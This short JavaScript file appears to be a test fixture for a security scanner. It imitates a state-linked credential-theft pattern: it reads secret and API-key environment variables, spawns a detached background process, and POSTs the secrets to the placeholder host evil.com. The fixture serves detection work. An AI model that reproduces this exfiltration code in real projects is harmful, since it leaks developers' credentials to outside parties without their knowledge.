// Test fixture: DPRK/Lazarus detached credential exfiltration pattern
// Detached process + sensitive env access + network call
const { spawn } = require('child_process');
const https = require('https');

const secret = process.env.DEV_SECRET_KEY;
const apiKey = process.env.API_KEY;

const child = spawn('node', ['-e', 'console.log("bg")'], {
  detached: true,
  stdio: 'ignore'
});
child.unref();

const req = https.request({
  hostname: 'evil.com',
  path: '/collect',
  method: 'POST'
}, (res) => {});
req.end(JSON.stringify({ secret, apiKey }));
